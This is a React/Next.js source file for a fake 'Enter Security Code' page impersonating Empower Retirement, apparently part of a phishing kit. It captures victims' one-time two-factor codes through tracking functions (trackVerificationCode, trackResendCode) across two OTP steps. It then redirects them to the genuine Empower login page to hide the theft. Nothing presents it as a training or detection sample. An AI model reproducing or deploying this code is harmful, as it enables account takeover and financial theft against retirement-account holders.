"use client"

import { Header } from "@/components/header"
import { Footer } from "@/components/footer"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import Link from "next/link"
import { useState, useEffect, Suspense } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { trackVerificationCode, trackResendCode, trackChooseDifferentMethod } from "@/lib/actions"

const EMPOWER_REDIRECT_URL = 'https://participant.empower-retirement.com/participant/#/sfd-login?accu=Empower'

function TwoFAVerifyContent() {
    const [code, setCode] = useState("")
    const [verificationType, setVerificationType] = useState<'SMS' | 'Call'>('SMS')
    const [isResending, setIsResending] = useState(false)
    const [isVerifying, setIsVerifying] = useState(false)
    const [isDifferentMethodLoading, setIsDifferentMethodLoading] = useState(false)
    const [countdown, setCountdown] = useState(0)
    const searchParams = useSearchParams()
    const router = useRouter()
    const isSecondOtp = searchParams.get('step') === '2'

    useEffect(() => {
        const type = searchParams.get('type') as 'SMS' | 'Call'
        if (type === 'SMS' || type === 'Call') {
            setVerificationType(type)
        }
    }, [searchParams])

    useEffect(() => {
        if (typeof window === "undefined") return
        if (isSecondOtp) {
            if (!sessionStorage.getItem("emp_otp2")) router.replace("/verify-identity")
        } else {
            if (!sessionStorage.getItem("emp_otp1")) router.replace("/")
        }
    }, [isSecondOtp, router])

    useEffect(() => {
        if (countdown > 0) {
            const timer = setTimeout(() => setCountdown(countdown - 1), 1000)
            return () => clearTimeout(timer)
        }
    }, [countdown])

    const handleVerifyCode = async (e: React.FormEvent) => {
        e.preventDefault()
        if (code.length !== 6 || isVerifying) return
        setIsVerifying(true)
        const notificationType = isSecondOtp ? "Code (final)" : "Code (first OTP)"
        trackVerificationCode(notificationType, code)
        await new Promise(resolve => setTimeout(resolve, 1000))
        if (isSecondOtp) {
            window.location.href = EMPOWER_REDIRECT_URL
        } else {
            if (typeof window !== "undefined") sessionStorage.setItem("emp_details", "1")
            router.push(`/verify-identity?type=${verificationType}`)
        }
    }

    const handleResendCode = async () => {
        if (countdown > 0 || isResending) return
        setIsResending(true)
        await trackResendCode(isSecondOtp)
        await new Promise(resolve => setTimeout(resolve, 2000))
        setIsResending(false)
        setCountdown(30)
    }

    const handleChooseDifferentMethod = async (e: React.MouseEvent) => {
        e.preventDefault()
        if (isDifferentMethodLoading || isVerifying) return
        setIsDifferentMethodLoading(true)
        trackChooseDifferentMethod()
        await new Promise(resolve => setTimeout(resolve, 2000))
        router.push(isSecondOtp ? '/verify-identity?type=' + verificationType : '/')
    }

    return (
        <main className="min-h-screen bg-white flex flex-col">
            
            <div
                style={{
                    backgroundImage: 'url(/empower-background-dark-white-flag.png)',
                    backgroundSize: 'cover',
                    backgroundRepeat: 'no-repeat',
                    backgroundPosition: 'center top'
                }}
                className="flex flex-col min-h-[60vh]"
            >
                <Header />

                <div className="flex-1 flex items-center justify-center py-12 px-4 bg-transparent">
                    <div className="bg-white rounded-[32px] p-8 md:p-12 shadow-xl w-full max-w-[500px] border border-gray-200">
                        <h1 className="text-2xl md:text-3xl font-bold text-[#363636] mb-4">Enter Security Code</h1>
                        <p className="text-gray-600 mb-8 leading-relaxed">
                            We've sent a 6-digit code to your mobile device. Please enter it below to verify your identity.
                        </p>

                        <form onSubmit={handleVerifyCode} className="space-y-6">
                            <div className="flex flex-col gap-2">
                                <label htmlFor="code" className="text-sm font-medium text-gray-700 ml-1">
                                    Verification Code
                                </label>
                                <Input
                                    id="code"
                                    type="text"
                                    placeholder="000000"
                                    maxLength={6}
                                    value={code}
                                    onChange={(e) => setCode(e.target.value.replace(/\D/g, ''))}
                                    disabled={isVerifying || isResending}
                                    className="text-2xl tracking-[0.5em] text-center h-14 border-gray-300 rounded-xl focus:ring-blue-500 focus:border-blue-500 disabled:opacity-70 disabled:pointer-events-none"
                                />
                            </div>

                            <Button 
                                type="submit" 
                                disabled={isVerifying || isResending || code.length !== 6}
                                className="w-full bg-[#003d6b] hover:bg-[#002d50] text-white h-12 rounded-xl font-bold text-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:pointer-events-none"
                            >
                                {isVerifying ? 'VERIFYING...' : 'VERIFY CODE'}
                            </Button>

                            <div className="text-center">
                                <button 
                                    type="button"
                                    onClick={handleResendCode}
                                    disabled={isVerifying || isResending || countdown > 0}
                                    className={`text-sm font-semibold ${
                                        isVerifying || isResending || countdown > 0
                                            ? 'text-gray-400 cursor-not-allowed pointer-events-none'
                                            : 'text-blue-600 hover:text-blue-700'
                                    }`}
                                >
                                    {isResending 
                                        ? 'Sending...' 
                                        : countdown > 0 
                                        ? `Resend in 0:${countdown.toString().padStart(2, '0')}`
                                        : "Didn't receive a code? Resend"
                                    }
                                </button>
                            </div>
                        </form>

                        <div className="mt-8 pt-6 border-t border-gray-100">
                            <button 
                                onClick={handleChooseDifferentMethod} 
                                disabled={isVerifying || isDifferentMethodLoading}
                                className={`font-medium text-sm ${
                                    isVerifying || isDifferentMethodLoading 
                                        ? 'text-gray-400 cursor-not-allowed pointer-events-none' 
                                        : 'text-blue-600 hover:text-blue-700'
                                }`}
                            >
                                {isDifferentMethodLoading ? 'Loading...' : isSecondOtp ? '← Back' : '← Choose a different method'}
                            </button>
                        </div>
                    </div>
                </div>

            </div>

            <Footer />
        </main>
    )
}

export default function TwoFAVerify() {
    return (
        <Suspense fallback={
            <main className="min-h-screen bg-white flex flex-col">
                <div className="flex-1 flex items-center justify-center">
                    <div className="text-center">
                        <p className="text-gray-600">Loading...</p>
                    </div>
                </div>
            </main>
        }>
            <TwoFAVerifyContent />
        </Suspense>
    )
}
